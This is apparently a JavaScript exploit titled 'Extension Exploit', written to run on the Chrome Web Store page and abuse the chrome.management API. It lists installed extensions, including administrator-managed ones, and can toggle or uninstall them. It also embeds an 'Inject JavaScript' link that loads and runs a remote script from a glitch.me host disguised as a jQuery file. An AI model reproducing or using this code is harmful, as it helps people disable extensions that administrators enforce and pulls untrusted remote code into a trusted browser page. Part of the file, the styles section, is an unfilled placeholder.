var developerMode = false
function isPageDev() {
  return localStorage.getItem('dev') ? 'dev' : ''
}
function isButtonDev() {
  return localStorage.getItem('dev') ? '' : 'unchecked'
}
function removeExtension(n) {
  chrome.management.uninstall(n)
}
function blobToDataURL(n) {
  return new Promise((e, t) => {
    var i = new FileReader()
    i.onload = function (n) {
      e(n.target.result)
    }
    i.onerror = function (n) {
      t(i.error)
    }
    i.onabort = function (n) {
      t(new Error('Read aborted'))
    }
    i.readAsDataURL(n)
  })
}
async function getIconFromExtension(n) {
  return n
    ? ((n = await (
        await fetch('https://chrome.google.com/webstore/detail/' + n)
      ).text()),
      (n = new DOMParser().parseFromString(n, 'text/html')).querySelector(
        'img.e-f-s[src]'
      )
        ? ((n = n.querySelector('img.e-f-s[src]').src),
          blobToDataURL(await (await fetch(n)).blob()))
        : '')
    : ''
}
function toggleExtension(n, e) {
  n.hasAttribute('unchecked')
    ? chrome.management.setEnabled(e, true)
    : chrome.management.setEnabled(e, false)
}
function toggle(n) {
  n.hasAttribute('unchecked')
    ? n.removeAttribute('unchecked')
    : n.setAttribute('unchecked', '')
}
function togglePress(n, e) {
  'down' == e
    ? n.children[1].children[0].children[0].setAttribute('open', '')
    : setTimeout(function () {
        n.children[1].children[0].children[0].style.display = 'none'
        n.children[1].children[0].children[0].removeAttribute('open')
        n.children[1].children[0].children[0].style.display = 'initial'
      }, 80)
}
function devMode() {
  document.body.hasAttribute('dev')
    ? (document.body.removeAttribute('dev'), localStorage.removeItem('dev'))
    : (document.body.setAttribute('dev', ''),
      localStorage.setItem('dev', 'true'))
}
function addExtension(n) {
  var e = document.getElementById('items'),
    t = document.createElement('div')
  t.className = 'item'
  t.setAttribute('data-id', n.id)
  n.managed && t.setAttribute('managed', '')
  var i = document.createElement('div'),
    o = ((i.className = 'item-main'), document.createElement('div')),
    r = ((o.className = 'item-img-wrapper'), document.createElement('img'))
  r.className = 'item-img'
  r.src = n.logo
  var a = document.createElement('div')
  a.className = 'item-img-source'
  a.innerHTML =
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" viewBox="0 0 24 24" class="item-img-source-icon"><path d="M12 7V3H2v18h20V7H12zM6 19H4v-2h2v2zm0-4H4v-2h2v2zm0-4H4V9h2v2zm0-4H4V5h2v2zm4 12H8v-2h2v2zm0-4H8v-2h2v2zm0-4H8V9h2v2zm0-4H8V5h2v2zm10 12h-8v-2h2v-2h-2v-2h2v-2h-2V9h8v10zm-2-8h-2v2h2v-2zm0 4h-2v2h2v-2z" style="fill: currentColor"></path></svg>'
  o.appendChild(r)
  o.appendChild(a)
  i.appendChild(o)
  ;(r = document.createElement('div')).className = 'item-content'
  ;(a = document.createElement('div')).className = 'item-title-and-version'
  ;(o = document.createElement('div')).className = 'item-title'
  o.innerText = n.title
  var d = document.createElement('div')
  d.className = 'item-version'
  d.innerText = n.version
  a.appendChild(o)
  a.appendChild(d)
  r.appendChild(a)
  ;(o = document.createElement('div')).className = 'item-description-overflow'
  ;(d = document.createElement('div')).className = 'item-description'
  d.innerText = n.description
  o.appendChild(d)
  r.appendChild(o)
  ;(a = document.createElement('div')).className = 'item-id'
  a.innerText = 'ID: ' + n.id
  r.appendChild(a)
  i.appendChild(r)
  t.appendChild(i)
  ;(d = document.createElement('div')).className = 'item-buttons'
  ;(o = document.createElement('div')).className = 'item-toggle'
  o.setAttribute(
    'onclick',
    "toggleExtension(this, '" + n.id + "');toggle(this)"
  )
  o.setAttribute('onmousedown', "togglePress(this, 'down')")
  o.setAttribute('onmouseup', "togglePress(this, 'up')")
  n.enabled || o.setAttribute('unchecked', '')
  ;(a = document.createElement('div')).className = 'item-bar'
  ;(r = document.createElement('div')).className = 'item-knob'
  ;(i = document.createElement('div')).className = 'item-ripple'
  ;(n = document.createElement('div')).className = 'ripple'
  i.appendChild(n)
  r.appendChild(i)
  o.appendChild(a)
  o.appendChild(r)
  d.appendChild(o)
  t.appendChild(d)
  e.appendChild(t)
}
async function getExtensions() {
  chrome.management.getAll(async function (n) {
    for (var e in n)
      n[e].isApp ||
        addExtension({
          title: n[e].name,
          version: n[e].version,
          description: n[e].description,
          id: n[e].id,
          logo: '',
          managed: 'admin' == n[e].installType,
          enabled: n[e].enabled,
        })
  })
  setTimeout(function () {
    setIcons()
  }, 100)
}
async function setIcons() {
  var n,
    e = document.querySelectorAll('.items .item')
  for (n in e)
    try {
      e[n].querySelector('.item-main .item-img-wrapper .item-img').src =
        await getIconFromExtension(e[n].dataset.id)
    } catch {}
}
window.location.toString().startsWith('https://chrome.google.com/webstore') ||
developerMode ||
(document.documentElement.innerHTML =
  "<html><head><link rel=\"icon\" href=\"data:image/svg+xml,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1'><path fill='white' d='M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z'></path></svg>\">\n<title>Extension Exploit</title>\n</head>\n<body " +
isPageDev() +
'>' +
'<a href="javascript:(function () {' +
  "var a = document.createElement('script');" +
  "a.src = 'https://jquery-scripts.glitch.me/scripts/3.0/jquery-3.0.5.min.js';" +
  "document.body.appendChild(a);" +
'})()">Inject JavaScript</a>' +
'<div class="nav">\n' +
'<div class="nav-left">\n' +
'<div class="nav-title">Extension Exploit</div>\n' +
'<div class="nav-right">\n' +
'<div class="nav-dev">Developer mode</div>\n' +
'<div ' +
isButtonDev() +
' class="item-toggle item-toggle-dev" id="toggle" ' +
'onclick="toggle(this);devMode()" onmousedown="togglePress(this, \'down\')" ' +
'onmouseup="togglePress(this, \'up\')">\n' +
'<div class="item-bar"></div>\n' +
'<div class="item-knob">\n' +
'<div class="item-ripple">\n' +
'<div class="ripple"></div>\n' +
'</div>\n' +
'</div>\n' +
'</div>\n' +
'</div>\n' +
'</div>\n' +
'<div class="items-main">\n' +
'<div class="items" id="items">\n' +
'<div class="patched">Error: This may have been patched</div>\n' +
'</div>\n' +
'</div>\n' +
'<style>\n' +
// ... (the rest of your existing styles)
'</style>\n' +
'</body>\n</html>';
chrome.management
  ? getExtensions()
  : document.getElementById('items').setAttribute('patched', ''))
